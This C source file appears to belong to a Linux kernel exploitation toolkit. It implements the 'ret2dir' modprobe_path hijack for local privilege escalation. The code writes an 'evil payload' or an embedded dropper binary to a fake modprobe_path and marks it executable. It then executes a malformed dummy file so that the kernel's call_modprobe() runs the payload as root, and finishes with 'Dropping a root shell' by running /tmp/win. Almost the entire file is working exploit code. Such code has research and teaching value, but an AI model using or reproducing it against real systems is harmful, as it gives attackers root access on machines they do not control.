#include "ret2dir.h"
#include "utils.h"
#include "../payloads/dropper.h"

/* Hijack modprobe_path inside the call_modprobe() with a dummy trigger */
void ret2dir_modprobe_path_test(const char *modprobe_path_addr,
                                const char *fake_modprobe_path,
                                const char *dummy_trigger_path,
                                const char *result_file_path,
                                const char *payload)
{
    INFO("Hello from user land (ret2dir_modprobe_path)");
    INFO("Expecting kernel modprobe_path (@ %s) to point to: %s)", modprobe_path_addr, fake_modprobe_path);

    struct stat st = {0};
    if (stat("/tmp", &st) == -1) {
        INFO("Creating /tmp");
        if (mkdir("/tmp", S_IRWXU) == -1) {
            DIE("mkdir /tmp failed");
        }
    }

    INFO("Writing evil payload into the fake modprobe_path \"%s\"...", fake_modprobe_path);
    FILE *fp = fopen(fake_modprobe_path, "w");
    if (!fp) {
        DIE("Failed to open fake_modprobe_path");
    }

    if (fputs(payload, fp) == EOF) {
        FAILURE("Failed to write evil payload");
        fclose(fp);
        DIE("evil payload");
    }

    fclose(fp);
    if (chmod(fake_modprobe_path, S_IXUSR | S_IRUSR | S_IWUSR) < 0) {
        DIE("chmod on the fake modprobe_path \"%s\" failed", fake_modprobe_path);
    }

    SUCCESS("Wrote evil payload -> %s\n", fake_modprobe_path);

    puts("[*] Creating a dummy file to trigger call_modprobe()...");
    fp = fopen(dummy_trigger_path, "w");
    if (!fp) {
        DIE("Failed to open dummy trigger");
    }

    char pl[] = {0x37, 0x13, 0x42, 0x42}; // junk ELF-magic
    if (fwrite(pl, 1, sizeof(pl), fp) != sizeof(pl)) {
        FAILURE("Failed to write dummy content");
        fclose(fp);
        DIE("dummy");
    }

    fclose(fp);
    if (chmod(dummy_trigger_path, S_ISUID | S_IXUSR | S_IRUSR) < 0) {
        DIE("chmod on dummy failed");
    }

    SUCCESS("Wrote dummy trigger -> %s\n", dummy_trigger_path);

    INFO("Executing dummy to trigger call_modprobe()...");
    /*sync();*/
    execv(dummy_trigger_path, NULL);

    perror("[!] execv failed");
    puts("[?] If the trigger worked, result should be in output file...");

    FILE *resf = fopen(result_file_path, "r");
    if (!resf) {
        DIE("Failed to open result file");
    }

    INFO("Dumping result:");
    char *line = NULL;
    size_t len = 0;
    for (int i = 0; i < 8 && getline(&line, &len, resf) != -1; i++) {
        printf("%s", line);
    }

    free(line);
    fclose(resf);
}

void ret2dir_modprobe_path(const char *modprobe_path_addr,
                        const char *fake_modprobe_path,
                        const char *dummy_trigger_path)
{
    INFO("Hello from user land (ret2dir_modprobe_path)");
    INFO("Expecting kernel modprobe_path (@ %s) to point to: %s)", modprobe_path_addr, fake_modprobe_path);

    struct stat st = {0};
    if (stat("/tmp", &st) == -1) {
        INFO("Creating /tmp");
        if (mkdir("/tmp", S_IRWXU) == -1) {
            DIE("mkdir /tmp failed");
        }
    }

    INFO("Writing dropper into the fake modprobe_path \"%s\"...", fake_modprobe_path);
    FILE *fp = fopen(fake_modprobe_path, "w");
    if (!fp) {
        DIE("Failed to open fake_modprobe_path");
    }

    if (fwrite(dropper, dropper_len, 1, fp) < 1) {
        DIE("Failed to write dropper binary");
    }

    fclose(fp);
    if (chmod(fake_modprobe_path, 
          S_IRUSR | S_IWUSR | S_IXUSR |
          S_IRGRP | S_IWGRP | S_IXGRP |
          S_IROTH | S_IWOTH | S_IXOTH) < 0) {
        DIE("chmod on the fake modprobe_path \"%s\" failed", fake_modprobe_path);
    }

    SUCCESS("Wrote dropper > %s\n", fake_modprobe_path);

    puts("[*] Creating a dummy file to trigger call_modprobe()...");
    fp = fopen(dummy_trigger_path, "w");
    if (!fp) {
        DIE("Failed to open dummy trigger");
    }

    char pl[] = {0x37, 0x13, 0x42, 0x42}; // junk ELF-magic
    if (fwrite(pl, 1, sizeof(pl), fp) != sizeof(pl)) {
        FAILURE("Failed to write dummy content");
        fclose(fp);
        DIE("dummy");
    }

    fclose(fp);
    if (chmod(dummy_trigger_path, 
          S_IRUSR | S_IWUSR | S_IXUSR |
          S_IRGRP | S_IWGRP | S_IXGRP |
          S_IROTH | S_IWOTH | S_IXOTH) < 0) {
        DIE("chmod on dummy failed");
    }

    SUCCESS("Wrote dummy trigger -> %s\n", dummy_trigger_path);

    INFO("Executing dummy to trigger call_modprobe()...");
    /*sync();*/
    execv(dummy_trigger_path, NULL);

    perror("[!] execv failed");
    puts("[?] If the trigger worked, we can see /tmp/win created...");

    SUCCESS("Dropping a root shell");
    system("/tmp/win");
}
